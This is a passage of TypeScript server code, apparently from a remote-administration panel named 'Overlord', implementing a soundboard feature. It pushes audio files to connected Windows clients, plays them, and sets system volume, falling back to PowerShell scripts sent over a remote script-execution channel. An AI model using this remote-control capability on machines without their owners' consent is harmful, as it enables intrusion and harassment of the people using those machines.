import { v4 as uuidv4 } from "uuid";
import { authenticateRequest } from "../../auth";
import { AuditAction, logAudit } from "../../auditLog";
import * as clientManager from "../../clientManager";
import { metrics } from "../../metrics";
import { encodeMessage } from "../../protocol";
import { requireClientAccess, requirePermission } from "../../rbac";
import { createUploadPull, uploadPulls } from "../file-transfer-state";
import { selectUploadPullUrl } from "../client-version";
import { logger } from "../../logger";
import {
  addSound,
  deleteSound,
  getSound,
  listSounds,
  soundFilePath,
  SOUNDBOARD_MAX_DURATION_SEC,
  SOUNDBOARD_MAX_ENTRIES,
  SOUNDBOARD_MAX_FILE_SIZE,
  type SoundboardEntry,
} from "../soundboard-library";
import {
  clearClientSoundPresence,
  clearSoundPresenceEverywhere,
  getClientSoundPresence,
  listClientPresence,
  markClientSoundUploaded,
  presenceMatches,
} from "../soundboard-client-cache";

type RequestIpProvider = {
  requestIP: (req: Request) => { address?: string } | null | undefined;
};

type CommandReplyResult = {
  ok: boolean;
  message?: string;
  code?: string;
};

type PendingCommandReply = {
  resolve: (result: CommandReplyResult) => void;
  reject: (error: Error) => void;
  timeout: NodeJS.Timeout;
  clientId: string;
  onProgress?: (payload: any) => void;
};

type PendingScript = {
  resolve: (result: any) => void;
  reject: (error: any) => void;
  timeout: NodeJS.Timeout;
  clientId: string;
};

export type SoundboardRouteDeps = {
  DATA_DIR: string;
  pendingCommandReplies: Map<string, PendingCommandReply>;
  pendingScripts: Map<string, PendingScript>;
  uploadTimeoutMs?: number;
  playTimeoutMs?: number;
};

type TransferPhase = "queued" | "client_transfer" | "succeeded" | "failed";
type PlayPhase = "queued" | "playing" | "succeeded" | "failed";
type JobStatus = "queued" | "running" | "succeeded" | "failed";

type TransferJob = {
  id: string;
  kind: "upload";
  clientId: string;
  soundId: string;
  soundName: string;
  destinationPath: string;
  pullId?: string;
  pullPath?: string;
  pullOrigin?: string;
  clientVersion?: string;
  requestOrigin?: string;
  totalBytes: number;
  bytesTransferred: number;
  speedBytesPerSecond: number;
  percent: number;
  phase: TransferPhase;
  status: JobStatus;
  startedAt: number;
  updatedAt: number;
  completedAt?: number;
  expiresAt: number;
  timeout: NodeJS.Timeout;
  clientAcknowledged: boolean;
  error?: { code: string; message: string; phase: TransferPhase };
};

type PlayOnlyJob = {
  id: string;
  kind: "play";
  clientId: string;
  soundId: string;
  soundName: string;
  destinationPath: string;
  totalBytes: number;
  bytesTransferred: number;
  speedBytesPerSecond: number;
  percent: number;
  phase: PlayPhase;
  status: JobStatus;
  startedAt: number;
  updatedAt: number;
  completedAt?: number;
  expiresAt: number;
  timeout: NodeJS.Timeout;
  clientAcknowledged: boolean;
  error?: { code: string; message: string; phase: PlayPhase };
};

type SoundboardJob = TransferJob | PlayOnlyJob;

const UPLOAD_TIMEOUT_MS = 3 * 60_000;
const PLAY_TIMEOUT_MS = 30_000;
const VOLUME_TIMEOUT_MS = 12_000;
const SCRIPT_TIMEOUT_MS = 25_000;
const JOB_TTL_MS = 10 * 60_000;

function isUnknownCommand(message?: string): boolean {
  return /unknown command/i.test(String(message || ""));
}

function psEscapeSingle(value: string): string {
  return String(value).replace(/'/g, "''");
}

const AUDIO_VOLUME_TYPEDEF = `
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public static class OverlordAudio {
  [ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")]
  private class MMDeviceEnumeratorComObject { }
  [Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
  private interface IMMDeviceEnumerator {
    int NotImpl1();
    [PreserveSig] int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice ppEndpoint);
  }
  [Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
  private interface IMMDevice {
    [PreserveSig] int Activate(ref Guid iid, int dwClsCtx, IntPtr pActivationParams, [MarshalAs(UnmanagedType.IUnknown)] out object ppInterface);
  }
  [Guid("5CDF2C82-841E-4546-9722-0CF74078229A"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
  private interface IAudioEndpointVolume {
    int NotImpl1(); int NotImpl2();
    [PreserveSig] int GetChannelCount(out uint pnChannelCount);
    [PreserveSig] int SetMasterVolumeLevel(float fLevelDB, Guid pguidEventContext);
    [PreserveSig] int SetMasterVolumeLevelScalar(float fLevel, Guid pguidEventContext);
    [PreserveSig] int GetMasterVolumeLevel(out float pfLevelDB);
    [PreserveSig] int GetMasterVolumeLevelScalar(out float pfLevel);
    [PreserveSig] int SetChannelVolumeLevel(uint nChannel, float fLevelDB, Guid pguidEventContext);
    [PreserveSig] int SetChannelVolumeLevelScalar(uint nChannel, float fLevel, Guid pguidEventContext);
    [PreserveSig] int GetChannelVolumeLevel(uint nChannel, out float pfLevelDB);
    [PreserveSig] int GetChannelVolumeLevelScalar(uint nChannel, out float pfLevel);
    [PreserveSig] int SetMute([MarshalAs(UnmanagedType.Bool)] bool bMute, Guid pguidEventContext);
    [PreserveSig] int GetMute(out bool pbMute);
  }
  private static IAudioEndpointVolume GetVolume() {
    var enumerator = (IMMDeviceEnumerator)(new MMDeviceEnumeratorComObject());
    IMMDevice device;
    Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(0, 1, out device));
    Guid iid = typeof(IAudioEndpointVolume).GUID;
    object o;
    Marshal.ThrowExceptionForHR(device.Activate(ref iid, 1, IntPtr.Zero, out o));
    return (IAudioEndpointVolume)o;
  }
  public static string Get() {
    var vol = GetVolume();
    float scalar; bool muted;
    Marshal.ThrowExceptionForHR(vol.GetMasterVolumeLevelScalar(out scalar));
    Marshal.ThrowExceptionForHR(vol.GetMute(out muted));
    int level = (int)Math.Round(scalar * 100.0);
    if (level < 0) level = 0; if (level > 100) level = 100;
    return "level=" + level + " muted=" + muted.ToString().ToLower();
  }
  public static string Set(int level) {
    if (level < 0) level = 0; if (level > 100) level = 100;
    var vol = GetVolume(); Guid g = Guid.Empty;
    Marshal.ThrowExceptionForHR(vol.SetMasterVolumeLevelScalar(level / 100f, g));
    Marshal.ThrowExceptionForHR(vol.SetMute(false, g));
    return Get();
  }
}
"@ -ErrorAction Stop
`.trim();

function buildVolumeGetScript(): string {
  return `${AUDIO_VOLUME_TYPEDEF}\nWrite-Output ([OverlordAudio]::Get())`;
}

function buildVolumeSetScript(level: number): string {
  return `${AUDIO_VOLUME_TYPEDEF}\nWrite-Output ([OverlordAudio]::Set(${Math.max(0, Math.min(100, Math.round(level)))}))`;
}

function buildPlaySoundScript(remotePath: string): string {
  const p = psEscapeSingle(remotePath);
  return `
$path = '${p}'
if (-not (Test-Path -LiteralPath $path -PathType Leaf)) { Write-Output 'play_failed:missing_file'; exit 2 }
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Text;
public static class OverlordMci {
  [DllImport("winmm.dll", CharSet = CharSet.Unicode)]
  public static extern int mciSendString(string command, StringBuilder buffer, int bufferSize, IntPtr hwndCallback);
}
"@ -ErrorAction Stop
[void][OverlordMci]::mciSendString("stop overlord_sb", $null, 0, [IntPtr]::Zero)
[void][OverlordMci]::mciSendString("close overlord_sb", $null, 0, [IntPtr]::Zero)
$open = 'open "' + $path + '" type mpegvideo alias overlord_sb'
$r = [OverlordMci]::mciSendString($open, $null, 0, [IntPtr]::Zero)
if ($r -ne 0) {
  $open = 'open "' + $path + '" type waveaudio alias overlord_sb'
  $r = [OverlordMci]::mciSendString($open, $null, 0, [IntPtr]::Zero)
}
if ($r -ne 0) { Write-Output ("play_failed:open:" + $r); exit 3 }
$r = [OverlordMci]::mciSendString("play overlord_sb", $null, 0, [IntPtr]::Zero)
if ($r -ne 0) { Write-Output ("play_failed:play:" + $r); exit 4 }
Write-Output 'playing'
exit 0
`.trim();
}

function buildStopSoundScript(): string {
  return `
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Text;
public static class OverlordMci {
  [DllImport("winmm.dll", CharSet = CharSet.Unicode)]
  public static extern int mciSendString(string command, StringBuilder buffer, int bufferSize, IntPtr hwndCallback);
}
"@ -ErrorAction Stop
[void][OverlordMci]::mciSendString("stop overlord_sb", $null, 0, [IntPtr]::Zero)
[void][OverlordMci]::mciSendString("close overlord_sb", $null, 0, [IntPtr]::Zero)
Write-Output 'stopped'
exit 0
`.trim();
}

async function runClientPowerShell(
  deps: SoundboardRouteDeps,
  clientId: string,
  script: string,
  timeoutMs: number,
): Promise<{ ok: boolean; result?: string; error?: string }> {
  const cmdId = uuidv4();
  const resultPromise = new Promise<{ ok: boolean; result?: string; error?: string }>((resolve, reject) => {
    const timeout = setTimeout(() => {
      deps.pendingScripts.delete(cmdId);
      resolve({ ok: false, error: "Script execution timed out" });
    }, timeoutMs);
    deps.pendingScripts.set(cmdId, { resolve, reject, timeout, clientId });
  });

  try {
    const target = clientManager.getClient(clientId);
    if (!target?.ws) throw new Error("Client is offline");
    target.ws.send(
      encodeMessage({
        type: "command",
        commandType: "script_exec",
        id: cmdId,
        payload: { script, type: "powershell" },
      }),
    );
  } catch (error) {
    const pending = deps.pendingScripts.get(cmdId);
    if (pending) {
      clearTimeout(pending.timeout);
      deps.pendingScripts.delete(cmdId);
    }
    return { ok: false, error: (error as Error)?.message || "Failed to send script" };
  }

  return resultPromise.catch((error) => ({
    ok: false,
    error: (error as Error)?.message || "Script failed",
  }));
}

const transferJobs = new Map<string, TransferJob>();
const playJobs = new Map<string, PlayOnlyJob>();

function now() {
  return Date.now();
}

function clampPercent(n: number) {
  if (!Number.isFinite(n)) return 0;
  return Math.max(0, Math.min(100, Math.round(n)));
}

function scheduleTransferCleanup(job: TransferJob) {
  return setTimeout(() => {
    const current = transferJobs.get(job.id);
    if (current && current.expiresAt <= Date.now()) {
      transferJobs.delete(job.id);
      if (current.pullId) uploadPulls.delete(current.pullId);
    }
  }, JOB_TTL_MS + 1_000);
}

function schedulePlayCleanup(job: PlayOnlyJob) {
  return setTimeout(() => {
    const current = playJobs.get(job.id);
    if (current && current.expiresAt <= Date.now()) {
      playJobs.delete(job.id);
    }
  }, JOB_TTL_MS + 1_000);
}

function setTransferPhase(job: TransferJob, phase: TransferPhase, percent?: number) {
  job.phase = phase;
  if (phase === "queued") job.status = "queued";
  else if (phase === "succeeded") job.status = "succeeded";
  else if (phase === "failed") job.status = "failed";
  else job.status = "running";
  if (typeof percent === "number") job.percent = clampPercent(percent);
  job.updatedAt = now();
}

function setPlayPhase(job: PlayOnlyJob, phase: PlayPhase, percent?: number) {
  job.phase = phase;
  if (phase === "queued") job.status = "queued";
  else if (phase === "succeeded") job.status = "succeeded";
  else if (phase === "failed") job.status = "failed";
  else job.status = "running";
  if (typeof percent === "number") job.percent = clampPercent(percent);
  job.updatedAt = now();
}

function failTransferJob(job: TransferJob, code: string, message: string, phase?: TransferPhase) {
  job.phase = phase || job.phase || "failed";
  job.status = "failed";
  job.percent = Math.min(job.percent, 99);
  job.completedAt = now();
  job.updatedAt = job.completedAt;
  job.error = { code, message, phase: job.phase };
  if (job.pullId) uploadPulls.delete(job.pullId);
}

function succeedTransferJob(job: TransferJob) {
  job.phase = "succeeded";
  job.status = "succeeded";
  job.bytesTransferred = job.totalBytes;
  job.percent = 100;
  job.completedAt = now();
  job.updatedAt = job.completedAt;
  if (job.pullId) uploadPulls.delete(job.pullId);
}

function failPlayJob(job: PlayOnlyJob, code: string, message: string, phase?: PlayPhase) {
  job.phase = phase || job.phase || "failed";
  job.status = "failed";
  job.percent = Math.min(job.percent, 99);
  job.completedAt = now();
  job.updatedAt = job.completedAt;
  job.error = { code, message, phase: job.phase };
}

function succeedPlayJob(job: PlayOnlyJob) {
  job.phase = "succeeded";
  job.status = "succeeded";
  job.percent = 100;
  job.completedAt = now();
  job.updatedAt = job.completedAt;
}

function serializeJob(job: SoundboardJob) {
  return {
    ok: job.status !== "failed",
    jobId: job.id,
    kind: job.kind,
    clientId: job.clientId,
    soundId: job.soundId,
    soundName: job.soundName,
    destinationPath: job.destinationPath,
    totalBytes: job.totalBytes,
    bytesTransferred: job.bytesTransferred,
    speedBytesPerSecond: job.speedBytesPerSecond,
    percent: job.percent,
    phase: job.phase,
    status: job.status,
    startedAt: job.startedAt,
    updatedAt: job.updatedAt,
    completedAt: job.completedAt,
    clientAcknowledged: job.clientAcknowledged,
    error: job.error,
  };
}

function relativePullUrl(pullId: string): string {
  return `/api/file/upload/pull/${encodeURIComponent(pullId)}`;
}

function firstHeaderValue(value: string | null): string {
  return String(value || "").split(",", 1)[0].trim();
}

function absolutePullUrl(pullPath: string, requestOrigin?: string): string {
  const configured = String(process.env.OVERLORD_EXTERNAL_URL || "").trim();
  if (configured) {
    try {
      const external = new URL(configured);
      if (external.protocol === "https:" || external.protocol === "http:") {
        return new URL(pullPath, external.origin).toString();
      }
    } catch {
      /* fall through */
    }
  }
  if (requestOrigin) {
    try {
      return new URL(pullPath, requestOrigin).toString();
    } catch {
      /* fall through */
    }
  }
  return pullPath;
}

function requestOriginFrom(req: Request): string | undefined {
  try {
    const requestUrl = new URL(req.url);
    const forwardedHost = firstHeaderValue(req.headers.get("x-forwarded-host"));
    const host = forwardedHost || firstHeaderValue(req.headers.get("host")) || requestUrl.host;
    if (!host) return undefined;
    const forwardedProtocol = firstHeaderValue(req.headers.get("x-forwarded-proto")).toLowerCase();
    const protocol =
      forwardedProtocol === "https" || forwardedProtocol === "http"
        ? forwardedProtocol
        : requestUrl.protocol === "https:"
          ? "https"
          : "http";
    return `${protocol}://${host}`;
  } catch {
    return undefined;
  }
}

function waitForCommandReply(
  deps: SoundboardRouteDeps,
  clientId: string,
  command: any,
  timeout: { code: string; message: string },
  timeoutMs: number,
  onProgress?: (payload: any) => void,
): Promise<CommandReplyResult> {
  const cmdId = command.id || uuidv4();
  command.id = cmdId;

  const replyPromise = new Promise<CommandReplyResult>((resolve, reject) => {
    const timer = setTimeout(() => {
      deps.pendingCommandReplies.delete(cmdId);
      resolve({ ok: false, code: timeout.code, message: timeout.message });
    }, timeoutMs);
    deps.pendingCommandReplies.set(cmdId, { resolve, reject, timeout: timer, clientId, onProgress });
  });

  try {
    const currentTarget = clientManager.getClient(clientId);
    if (!currentTarget?.ws) throw new Error("Client is offline");
    currentTarget.ws.send(encodeMessage(command));
  } catch (error) {
    const pending = deps.pendingCommandReplies.get(cmdId);
    if (pending) {
      clearTimeout(pending.timeout);
      deps.pendingCommandReplies.delete(cmdId);
    }
    return Promise.resolve({
      ok: false,
      code: "send_command_failed",
      message: (error as Error)?.message || "Failed to send command",
    });
  }

  return replyPromise.catch((error) => ({
    ok: false,
    code: "send_command_failed",
    message: (error as Error)?.message || timeout.message,
  }));
}

function updateTransferFromProgress(job: TransferJob, payload: any) {
  job.clientAcknowledged = true;
  const transferred = Number(payload?.transferred);
  const total = Number(payload?.total);
  if (Number.isFinite(transferred) && transferred >= 0) {
    job.bytesTransferred = Math.min(transferred, job.totalBytes);
  }
  if (Number.isFinite(total) && total > 0) {
    job.totalBytes = total;
  }
  const speed = Number(payload?.speedBytesPerSecond);
  if (Number.isFinite(speed) && speed >= 0) {
    job.speedBytesPerSecond = speed;
  }
  job.updatedAt = now();
  if (job.phase === "queued") setTransferPhase(job, "client_transfer");
  if (job.totalBytes > 0) {
    job.percent = clampPercent(Math.min(99, (job.bytesTransferred / job.totalBytes) * 99));
  }
}

function clientDestinationPath(entry: SoundboardEntry): string {
  return `C:\\Users\\Public\\Overlord\\soundboard\\${entry.id}.${entry.ext}`;
}

function parseVolumeMessage(message?: string): { level: number; muted: boolean } | null {
  const text = String(message || "");
  const levelMatch = text.match(/level=(\d+)/i);
  if (!levelMatch) return null;
  const mutedMatch = text.match(/muted=(true|false)/i);
  return {
    level: Math.max(0, Math.min(100, Number(levelMatch[1]))),
    muted: mutedMatch ? mutedMatch[1].toLowerCase() === "true" : false,
  };
}

function corsJson(data: unknown, status = 200) {
  return Response.json(data, { status });
}

async function runUploadJob(
  job: TransferJob,
  deps: SoundboardRouteDeps,
  entry: SoundboardEntry,
  filePath: string,
  user: any,
  ip: string,
) {
  try {
    setTransferPhase(job, "client_transfer", 0);
    const pullId = createUploadPull({
      clientId: job.clientId,
      filePath,
      fileName: `${entry.id}.${entry.ext}`,
      size: entry.size,
      ttlMs: 5 * 60_000,
    });
    job.pullId = pullId;
    const pullPath = relativePullUrl(pullId);
    job.pullPath = pullPath;
    // Display/legacy absolute origin; modern agents prefer relative rewrite.
    job.pullOrigin = absolutePullUrl(pullPath, job.requestOrigin);
    const uploadUrl = selectUploadPullUrl({
      clientVersion: job.clientVersion,
      pullPath,
      pullOrigin: job.pullOrigin,
    });

    logger.info(
      `[soundboard] upload ${entry.id} → ${job.destinationPath} via ${uploadUrl} (display=${job.pullOrigin}, clientVersion=${job.clientVersion || "unknown"}, ${entry.size} bytes)`,
    );

    const uploadResult = await waitForCommandReply(
      deps,
      job.clientId,
      {
        type: "command",
        commandType: "file_upload_http",
        id: uuidv4(),
        payload: { path: job.destinationPath, url: uploadUrl, total: entry.size },
      },
      {
        code: "client_transfer_timeout",
        message: job.clientAcknowledged
          ? "client did not finish downloading the sound before timeout"
          : "client did not acknowledge the sound transfer; check network path to the server",
      },
      deps.uploadTimeoutMs ?? UPLOAD_TIMEOUT_MS,
      (payload) => updateTransferFromProgress(job, payload),
    );

    if (uploadResult.code !== "client_transfer_timeout" && uploadResult.code !== "send_command_failed") {
      job.clientAcknowledged = true;
    }

    if (!uploadResult.ok) {
      const failureMessage =
        uploadResult.code === "client_transfer_timeout" && !job.clientAcknowledged
          ? "client did not acknowledge the sound transfer command before timeout; the file transfer never started"
          : uploadResult.message || "Failed to transfer sound to client";
      failTransferJob(
        job,
        uploadResult.code || "client_transfer_failed",
        failureMessage,
        "client_transfer",
      );
      logAudit({
        timestamp: Date.now(),
        username: user.username,
        ip,
        action: AuditAction.COMMAND,
        targetClientId: job.clientId,
        success: false,
        details: `soundboard_upload_client:${entry.name}:${failureMessage}`.slice(0, 200),
      });
      return;
    }

    job.clientAcknowledged = true;
    job.bytesTransferred = job.totalBytes;
    await markClientSoundUploaded(deps.DATA_DIR, job.clientId, {
      soundId: entry.id,
      sha256: entry.sha256,
      path: job.destinationPath,
      uploadedAt: now(),
    });
    succeedTransferJob(job);
    metrics.recordCommand("file_upload_http");
    logAudit({
      timestamp: Date.now(),
      username: user.username,
      ip,
      action: AuditAction.COMMAND,
      targetClientId: job.clientId,
      success: true,
      details: `soundboard_upload_client:${entry.name}`.slice(0, 200),
    });
  } catch (error) {
    failTransferJob(job, "upload_job_failed", (error as Error)?.message || "Upload job failed");
  }
}

async function runPlayOnlyJob(
  job: PlayOnlyJob,
  deps: SoundboardRouteDeps,
  entry: SoundboardEntry,
  user: any,
  ip: string,
) {
  try {
    setPlayPhase(job, "playing", 10);

    let playResult = await waitForCommandReply(
      deps,
      job.clientId,
      {
        type: "command",
        commandType: "play_sound",
        id: uuidv4(),
        payload: { path: job.destinationPath, soundId: entry.id, sha256: entry.sha256 },
      },
      {
        code: "play_timeout",
        message: "play_sound timed out on the client",
      },
      deps.playTimeoutMs ?? PLAY_TIMEOUT_MS,
    );

    if (!playResult.ok && isUnknownCommand(playResult.message)) {
      logger.info(`[soundboard] client ${job.clientId} lacks play_sound; PowerShell fallback`);
      const ps = await runClientPowerShell(
        deps,
        job.clientId,
        buildPlaySoundScript(job.destinationPath),
        SCRIPT_TIMEOUT_MS,
      );
      const out = String(ps.result || ps.error || "");
      playResult = {
        ok: !!ps.ok && /playing/i.test(out),
        message: out || ps.error || "play failed",
        code: ps.ok ? undefined : "play_ps_failed",
      };
    }

    if (!playResult.ok) {
      const msg = playResult.message || "Play failed";
      if (/not found|hash mismatch|missing_file/i.test(msg)) {
        await clearClientSoundPresence(deps.DATA_DIR, job.clientId, entry.id);
      }
      failPlayJob(job, playResult.code || "play_failed", msg, "playing");
      logAudit({
        timestamp: Date.now(),
        username: user.username,
        ip,
        action: AuditAction.COMMAND,
        targetClientId: job.clientId,
        success: false,
        details: `play_sound:${entry.name}:${msg}`.slice(0, 200),
      });
      return;
    }

    succeedPlayJob(job);
    metrics.recordCommand("play_sound");
    logAudit({
      timestamp: Date.now(),
      username: user.username,
      ip,
      action: AuditAction.COMMAND,
      targetClientId: job.clientId,
      success: true,
      details: `play_sound:${entry.name}`.slice(0, 200),
    });
  } catch (error) {
    failPlayJob(job, "play_job_failed", (error as Error)?.message || "Play job failed");
  }
}

export async function handleSoundboardRoutes(
  req: Request,
  url: URL,
  server: RequestIpProvider,
  deps: SoundboardRouteDeps,
): Promise<Response | null> {
  const { pathname } = url;

  const libraryList = pathname === "/api/soundboard/sounds";
  const libraryItem = pathname.match(/^\/api\/soundboard\/sounds\/([^/]+)$/);
  const libraryFile = pathname.match(/^\/api\/soundboard\/sounds\/([^/]+)\/file$/);
  const volumeMatch = pathname.match(/^\/api\/clients\/([^/]+)\/volume$/);
  const clientStatusMatch = pathname.match(/^\/api\/clients\/([^/]+)\/soundboard\/status$/);
  const uploadMatch = pathname.match(/^\/api\/clients\/([^/]+)\/soundboard\/upload$/);
  const uploadStatusMatch = pathname.match(/^\/api\/clients\/([^/]+)\/soundboard\/upload\/([^/]+)$/);
  const playMatch = pathname.match(/^\/api\/clients\/([^/]+)\/soundboard\/play$/);
  const playStatusMatch = pathname.match(/^\/api\/clients\/([^/]+)\/soundboard\/play\/([^/]+)$/);
  const stopMatch = pathname.match(/^\/api\/clients\/([^/]+)\/soundboard\/stop$/);

  const isSoundboard =
    libraryList ||
    libraryItem ||
    libraryFile ||
    volumeMatch ||
    clientStatusMatch ||
    uploadMatch ||
    uploadStatusMatch ||
    playMatch ||
    playStatusMatch ||
    stopMatch;
  if (!isSoundboard) return null;

  const user = await authenticateRequest(req);
  if (!user) return new Response("Unauthorized", { status: 401 });

  try {
    requirePermission(user, "clients:control");
  } catch (error) {
    if (error instanceof Response) return error;
    return new Response("Forbidden", { status: 403 });
  }

  const ip = server.requestIP(req)?.address || "unknown";

  if (libraryList && req.method === "GET") {
    const sounds = await listSounds(deps.DATA_DIR);
    return corsJson({
      ok: true,
      sounds,
      limits: {
        maxFileSize: SOUNDBOARD_MAX_FILE_SIZE,
        maxDurationSec: SOUNDBOARD_MAX_DURATION_SEC,
        maxEntries: SOUNDBOARD_MAX_ENTRIES,
        extensions: ["mp3", "wav"],
      },
    });
  }

  if (libraryList && req.method === "POST") {
    let form: FormData;
    try {
      form = await req.formData();
    } catch {
      return corsJson({ ok: false, error: "Invalid form data" }, 400);
    }
    const file = form.get("file");
    if (!(file instanceof File)) {
      return corsJson({ ok: false, error: "Missing file" }, 400);
    }
    const durationRaw = form.get("durationSec");
    const durationSec =
      durationRaw != null && String(durationRaw).trim() !== "" ? Number(durationRaw) : undefined;
    try {
      const bytes = new Uint8Array(await file.arrayBuffer());
      const entry = await addSound(deps.DATA_DIR, {
        fileName: file.name,
        bytes,
        durationSec: Number.isFinite(durationSec as number) ? (durationSec as number) : undefined,
      });
      logAudit({
        timestamp: Date.now(),
        username: user.username,
        ip,
        action: AuditAction.COMMAND,
        success: true,
        details: `soundboard_upload:${entry.name}:${entry.size}`,
      });
      return corsJson({ ok: true, sound: entry });
    } catch (error: any) {
      const status = error?.status || 500;
      return corsJson({ ok: false, error: error?.message || "Upload failed", code: error?.code }, status);
    }
  }

  if (libraryFile && req.method === "GET") {
    const id = decodeURIComponent(libraryFile[1]);
    const entry = await getSound(deps.DATA_DIR, id);
    if (!entry) return corsJson({ ok: false, error: "Sound not found" }, 404);
    const filePath = soundFilePath(deps.DATA_DIR, entry);
    try {
      const file = Bun.file(filePath);
      if (!(await file.exists())) return corsJson({ ok: false, error: "Sound file missing" }, 404);
      const contentType = entry.ext === "wav" ? "audio/wav" : "audio/mpeg";
      return new Response(file, {
        headers: {
          "Content-Type": contentType,
          "Content-Length": String(entry.size),
          "Cache-Control": "private, max-age=3600",
        },
      });
    } catch {
      return corsJson({ ok: false, error: "Failed to read sound" }, 500);
    }
  }

  if (libraryItem && req.method === "DELETE") {
    const id = decodeURIComponent(libraryItem[1]);
    const entry = await getSound(deps.DATA_DIR, id);
    const removed = await deleteSound(deps.DATA_DIR, id);
    if (!removed) return corsJson({ ok: false, error: "Sound not found" }, 404);
    await clearSoundPresenceEverywhere(deps.DATA_DIR, id);
    logAudit({
      timestamp: Date.now(),
      username: user.username,
      ip,
      action: AuditAction.COMMAND,
      success: true,
      details: `soundboard_delete:${entry?.name || id}`,
    });
    return corsJson({ ok: true });
  }

  if (libraryList || libraryItem || libraryFile) {
    return corsJson({ ok: false, error: "Method not allowed" }, 405);
  }

  const clientId = decodeURIComponent(
    (volumeMatch || clientStatusMatch || uploadMatch || uploadStatusMatch || playMatch || playStatusMatch || stopMatch)![1],
  );
  try {
    requireClientAccess(user, clientId);
  } catch (error) {
    if (error instanceof Response) return error;
    return new Response("Forbidden", { status: 403 });
  }

  if (clientStatusMatch && req.method === "GET") {
    const sounds = await listSounds(deps.DATA_DIR);
    const byId = new Map(sounds.map((s) => [s.id, s]));
    const presence = await listClientPresence(deps.DATA_DIR, clientId);
    const ready: Array<{ soundId: string; sha256: string; path: string; uploadedAt: number }> = [];
    for (const p of presence) {
      const entry = byId.get(p.soundId);
      if (!entry) {
        await clearClientSoundPresence(deps.DATA_DIR, clientId, p.soundId);
        continue;
      }
      if (!presenceMatches(p, entry.id, entry.sha256, clientDestinationPath(entry))) {
        await clearClientSoundPresence(deps.DATA_DIR, clientId, p.soundId);
        continue;
      }
      ready.push({
        soundId: p.soundId,
        sha256: p.sha256,
        path: p.path,
        uploadedAt: p.uploadedAt,
      });
    }
    return corsJson({
      ok: true,
      clientId,
      readySoundIds: ready.map((r) => r.soundId),
      ready,
    });
  }

  if (uploadStatusMatch && req.method === "GET") {
    const jobId = decodeURIComponent(uploadStatusMatch[2]);
    const job = transferJobs.get(jobId);
    if (!job || job.clientId !== clientId || job.expiresAt < Date.now()) {
      return corsJson({ ok: false, error: "Upload job not found" }, 404);
    }
    return corsJson(serializeJob(job));
  }

  if (playStatusMatch && req.method === "GET") {
    const jobId = decodeURIComponent(playStatusMatch[2]);
    const job = playJobs.get(jobId);
    if (!job || job.clientId !== clientId || job.expiresAt < Date.now()) {
      return corsJson({ ok: false, error: "Play job not found" }, 404);
    }
    return corsJson(serializeJob(job));
  }

  if (volumeMatch && (req.method === "GET" || req.method === "PUT" || req.method === "POST")) {
    const target = clientManager.getClient(clientId);
    if (!target?.ws) return corsJson({ ok: false, error: "Client is offline" }, 400);

    let level: number | undefined;
    let max = false;
    if (req.method !== "GET") {
      let body: any = {};
      try {
        body = await req.json();
      } catch {
        body = {};
      }
      if (body?.max === true) max = true;
      if (body?.level != null) {
        const n = Number(body.level);
        if (!Number.isFinite(n) || n < 0 || n > 100) {
          return corsJson({ ok: false, error: "level must be 0-100" }, 400);
        }
        level = Math.round(n);
      }
      if (!max && level === undefined) {
        return corsJson({ ok: false, error: "Provide level (0-100) or max: true" }, 400);
      }
    }

    const payload: Record<string, unknown> = {};
    if (max) payload.max = true;
    else if (level !== undefined) payload.level = level;

    let result = await waitForCommandReply(
      deps,
      clientId,
      {
        type: "command",
        commandType: "system_volume",
        id: uuidv4(),
        payload,
      },
      { code: "volume_timeout", message: "system_volume timed out" },
      VOLUME_TIMEOUT_MS,
    );

    if (!result.ok && (isUnknownCommand(result.message) || result.code === "volume_timeout")) {
      const setLevel = max ? 100 : level;
      const script =
        setLevel === undefined ? buildVolumeGetScript() : buildVolumeSetScript(setLevel);
      const ps = await runClientPowerShell(deps, clientId, script, SCRIPT_TIMEOUT_MS);
      const out = String(ps.result || "");
      result = {
        ok: !!ps.ok && /level=\d+/i.test(out),
        message: out || ps.error || result.message,
      };
    }

    if (!result.ok) {
      logAudit({
        timestamp: Date.now(),
        username: user.username,
        ip,
        action: AuditAction.COMMAND,
        targetClientId: clientId,
        success: false,
        details: `system_volume:${result.message || "failed"}`.slice(0, 200),
      });
      return corsJson({ ok: false, error: result.message || "Volume command failed" }, 502);
    }

    const parsed = parseVolumeMessage(result.message);
    metrics.recordCommand("system_volume");
    logAudit({
      timestamp: Date.now(),
      username: user.username,
      ip,
      action: AuditAction.COMMAND,
      targetClientId: clientId,
      success: true,
      details: `system_volume:${result.message || ""}`.slice(0, 200),
    });
    return corsJson({
      ok: true,
      level: parsed?.level ?? level ?? null,
      muted: parsed?.muted ?? false,
      message: result.message,
    });
  }

  if (stopMatch && req.method === "POST") {
    const target = clientManager.getClient(clientId);
    if (!target?.ws) return corsJson({ ok: false, error: "Client is offline" }, 400);

    let result = await waitForCommandReply(
      deps,
      clientId,
      {
        type: "command",
        commandType: "stop_sound",
        id: uuidv4(),
        payload: {},
      },
      { code: "stop_timeout", message: "stop_sound timed out" },
      12_000,
    );

    if (!result.ok && (isUnknownCommand(result.message) || result.code === "stop_timeout")) {
      const ps = await runClientPowerShell(deps, clientId, buildStopSoundScript(), SCRIPT_TIMEOUT_MS);
      const out = String(ps.result || "");
      result = {
        ok: !!ps.ok && /stopped/i.test(out),
        message: out || ps.error || result.message,
      };
    }

    metrics.recordCommand("stop_sound");
    logAudit({
      timestamp: Date.now(),
      username: user.username,
      ip,
      action: AuditAction.COMMAND,
      targetClientId: clientId,
      success: !!result.ok,
      details: `stop_sound:${result.message || ""}`.slice(0, 120),
    });
    if (!result.ok) {
      return corsJson({ ok: false, error: result.message || "Stop failed" }, 502);
    }
    return corsJson({ ok: true, message: result.message || "stopped" });
  }

  if (uploadMatch && req.method === "POST") {
    const target = clientManager.getClient(clientId);
    if (!target?.ws) return corsJson({ ok: false, error: "Client is offline" }, 400);

    let body: any = {};
    try {
      body = await req.json();
    } catch {
      body = {};
    }
